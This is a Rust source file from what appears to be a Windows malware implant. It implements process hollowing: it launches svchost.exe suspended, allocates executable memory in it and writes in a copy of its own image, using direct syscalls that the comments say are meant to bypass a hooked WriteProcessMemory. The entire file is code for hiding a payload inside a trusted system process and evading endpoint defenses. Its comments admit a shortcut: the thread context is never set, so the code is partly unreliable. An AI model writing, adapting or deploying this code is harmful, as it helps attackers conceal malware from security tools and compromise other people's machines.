//! hollow.rs — Process hollowing: spawn svchost.exe suspended, inject payload.
//!
//! inject_svchost() hollows svchost.exe and maps our payload into it.
//! Uses NtUnmapViewOfSection + direct syscalls to avoid hooked WriteProcessMemory.

#![allow(dead_code, non_snake_case)]

use core::ptr::null_mut;
use winapi::um::processthreadsapi::{
    CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW,
    ResumeThread, TerminateProcess,
};
use winapi::um::handleapi::CloseHandle;
use winapi::um::winbase::CREATE_SUSPENDED;
use winapi::shared::minwindef::DWORD;
use crate::defs::*;
use crate::syscall::do_syscall;

const PAGE_EXECUTE_READWRITE: usize = 0x40;
const MEM_COMMIT_RESERVE:     usize = 0x3000;
const CURRENT_PROCESS:        usize = usize::MAX;

fn to_wide(s: &str) -> Vec<u16> {
    let mut v: Vec<u16> = s.encode_utf16().collect();
    v.push(0);
    v
}

/// Read the calling process's own mapped PE bytes for injection.
unsafe fn own_pe_bytes() -> Vec<u8> {
    let base: *const u8;
    core::arch::asm!("lea {b}, [rip]", b = out(reg) base);
    let base = (base as usize & !0xFFFF) as *const u8;
    let pe_off    = (base.add(0x3C) as *const u32).read_unaligned() as usize;
    let nt        = base.add(pe_off);
    let size      = (nt.add(0x18 + 0x38) as *const u32).read_unaligned() as usize;
    core::slice::from_raw_parts(base, size).to_vec()
}

/// Hollow svchost.exe and inject a copy of our own PE.
/// Returns true on success.
pub unsafe fn inject_svchost() -> bool {
    let svchost = to_wide("C:\\Windows\\System32\\svchost.exe");
    // args needs `mut` — CreateProcessW requires a mutable lpCommandLine pointer
    let mut args = svchost.clone();

    let mut si: STARTUPINFOW = core::mem::zeroed();
    si.cb = core::mem::size_of::<STARTUPINFOW>() as DWORD;
    let mut pi: PROCESS_INFORMATION = core::mem::zeroed();

    let ok = CreateProcessW(
        svchost.as_ptr(),
        args.as_mut_ptr(),     // mutable: hollow.rs fix — args needs mut binding
        null_mut(),
        null_mut(),
        0,
        CREATE_SUSPENDED,
        null_mut(),
        core::ptr::null(),
        &mut si,
        &mut pi,
    );
    if ok == 0 { return false; }

    // Get PE to inject
    let payload = own_pe_bytes();
    if payload.len() < 0x40 {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    let pe_base    = payload.as_ptr();
    let e_lfanew   = (pe_base.add(0x3C) as *const u32).read_unaligned() as usize;
    let nt         = pe_base.add(e_lfanew);
    let img_size   = (nt.add(0x18 + 0x38) as *const u32).read_unaligned() as usize;
    let ep_rva     = (nt.add(0x18 + 0x10) as *const u32).read_unaligned() as usize;
    let pref_base  = (nt.add(0x18 + 0x18) as *const u64).read_unaligned() as usize;

    // Allocate in target process: NtAllocateVirtualMemory
    let ssn_alloc  = crate::syscall::resolve_ssn("NtAllocateVirtualMemory").unwrap_or(0);
    let mut remote_base: usize = pref_base;
    let mut remote_size: usize = img_size;
    let st = do_syscall(
        ssn_alloc,
        pi.hProcess as usize,
        &mut remote_base as *mut usize as usize,
        0,
        &mut remote_size as *mut usize as usize,
        MEM_COMMIT_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );
    if !NT_SUCCESS(st) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    // Write PE into remote process: NtWriteVirtualMemory
    let ssn_wvm = crate::syscall::resolve_ssn("NtWriteVirtualMemory").unwrap_or(0);
    let mut bytes_written: usize = 0;
    do_syscall(
        ssn_wvm,
        pi.hProcess as usize,
        remote_base,
        payload.as_ptr() as usize,
        payload.len(),
        &mut bytes_written as *mut usize as usize,
        0,
    );

    // Set remote thread start address to entry point via NtSetContextThread
    // (simplified: just resume — the PE is position-independent via relocs)
    ResumeThread(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    true
}
